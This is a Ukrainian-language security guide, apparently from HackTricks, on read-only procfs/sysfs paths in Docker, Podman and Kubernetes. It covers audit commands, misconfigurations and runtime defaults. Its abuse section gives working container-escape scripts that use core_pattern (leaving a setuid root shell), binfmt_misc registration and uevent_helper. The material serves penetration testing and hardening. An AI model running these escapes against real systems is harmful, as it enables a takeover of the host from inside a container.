# Системні шляхи тільки для читання

{{#include ../../../../banners/hacktricks-training.md}}

Системні шляхи тільки для читання — це окремий механізм захисту від замаскованих шляхів. Замість повного приховування шляху runtime робить його видимим, але монтує як тільки для читання. Це поширено для окремих місць procfs та sysfs, де доступ для читання може бути прийнятним або необхідним для роботи, але записи були б надто небезпечними.

Мета проста: багато інтерфейсів ядра стають значно небезпечнішими, коли вони доступні для запису. Монтування тільки для читання не усуває всю розвідувальну цінність, але запобігає тому, щоб скомпрометоване робоче навантаження могло змінювати файли, що звертаються до ядра, через цей шлях.

## Принцип роботи

Runtimes часто позначають частини виду proc/sys як тільки для читання. Залежно від runtime та хоста це може включати такі шляхи:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Фактичний список варіюється, але модель та сама: дозволити видимість там, де потрібно, за замовчуванням заборонити зміну.

## Лаб

Перегляньте список шляхів тільки для читання, задекларований Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Перегляньте змонтований вигляд proc/sys зсередини контейнера:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Вплив на безпеку

Системні шляхи, змонтовані тільки для читання, звужують широкий клас зловживань, що впливають на host. Навіть коли атакуючий може переглядати procfs або sysfs, неможливість запису туди усуває багато шляхів для прямого модифікування, пов’язаних із параметрами ядра, обробниками аварій, помічниками завантаження модулів або іншими інтерфейсами керування. Експозиція не зникає, але перехід від розкриття інформації до впливу на host стає складнішим.

## Неправильні налаштування

Основні помилки — unmasking або перемонтування чутливих шляхів у режимі читання‑запису, пряме експонування host proc/sys через writable bind mounts, або використання privileged режимів, які фактично обходять більш безпечні runtime за замовчуванням. У Kubernetes, `procMount: Unmasked` і privileged workloads часто йдуть разом із слабішим захистом proc. Ще одна поширена операційна помилка — припущення, що оскільки runtime зазвичай монтує ці шляхи тільки для читання, то всі workloads досі наслідують цей дефолт.

## Зловживання

Якщо захист слабкий, почніть із пошуку записуваних записів у proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Коли присутні записувані елементи, найбільш цінні шляхи для подальших дій включають:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Що ці команди можуть виявити:

- Writable записи під `/proc/sys` часто означають, що контейнер може змінювати поведінку host kernel, а не лише її переглядати.
- `core_pattern` має особливе значення, оскільки writable host-facing значення можна перетворити на host code-execution шлях, спричинивши крах процесу після встановлення pipe handler.
- `modprobe` показує хелпер, який kernel використовує для потоків, пов’язаних із завантаженням модулів; коли writable, це класична високовартісна ціль.
- `binfmt_misc` каже, чи можлива реєстрація кастомного інтерпретатора. Якщо реєстрація writable, це може стати примітивом виконання, а не лише інформаційним leak.
- `panic_on_oom` контролює рішення kernel на рівні хоста і тому може перетворити виснаження ресурсів на host denial of service.
- `uevent_helper` — один із найочевидніших прикладів writable sysfs хелпер-шляху, який призводить до виконання в контексті host.

Цікавими знахідками є writable host-facing proc налаштування або записи sysfs, які зазвичай мали бути read-only. У такому випадку робоче навантаження переходить від обмеженого контейнерного вигляду до можливості істотного впливу на kernel.

### Full Example: `core_pattern` Host Escape

Якщо `/proc/sys/kernel/core_pattern` writable зсередини контейнера і вказує на view ядра хоста, його можна зловживати для виконання payload після краху:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Якщо шлях дійсно досягає ядра хоста, payload виконується на хості і залишає setuid shell.

### Повний приклад: реєстрація `binfmt_misc`

Якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису, реєстрація кастомного інтерпретатора може призвести до code execution, коли відповідний файл буде виконано:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
На доступному з хоста для запису `binfmt_misc` результатом є виконання коду в шляху інтерпретатора, викликаного kernel.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, kernel може викликати host-path helper при виникненні відповідної події:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Причина, чому це так небезпечно, полягає в тому, що шлях до допоміжної утиліти розв'язується з перспективи файлової системи хоста, а не з безпечного контексту, обмеженого лише контейнером.

## Перевірки

Ці перевірки визначають, чи доступ до procfs/sysfs зроблено лише для читання там, де це очікується, і чи може робоче навантаження все ще змінювати чутливі інтерфейси ядра.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Що цікаво тут:

- Звичайне загартоване навантаження має відкривати у доступі дуже мало записуваних записів у /proc/sys.
- Записувані шляхи /proc/sys часто важливіші, ніж звичайний доступ лише для читання.
- Якщо runtime каже, що шлях лише для читання, але на практиці його можна записувати, уважно перевірте mount propagation, bind mounts і налаштування привілеїв.

## Налаштування runtime за замовчуванням

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Типові ручні послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням | Docker визначає стандартний список шляхів лише для читання для чутливих proc записів | виставлення хостових /proc/sys mount-ів, `--privileged` |
| Podman | Увімкнено за замовчуванням | Podman застосовує стандартні шляхи лише для читання, якщо їх явно не послаблено | `--security-opt unmask=ALL`, широкі хостові mount-и, `--privileged` |
| Kubernetes | Успадковує налаштування runtime за замовчуванням | Використовує модель read-only шляхів підлеглого runtime, якщо вона не послаблена налаштуваннями Pod або хостовими mount-ами | `procMount: Unmasked`, привілейовані workloads, записувані хостові /proc/sys mount-и |
| containerd / CRI-O under Kubernetes | Runtime за замовчуванням | Зазвичай покладається на OCI/runtime за замовчуванням | так само, як у рядку Kubernetes; прямі зміни конфігурації runtime можуть послабити поведінку |

Ключовий момент у тому, що шляхи системи лише для читання зазвичай присутні як налаштування runtime за замовчуванням, але їх легко підірвати привілейованими режимами або хостовими bind mounts.
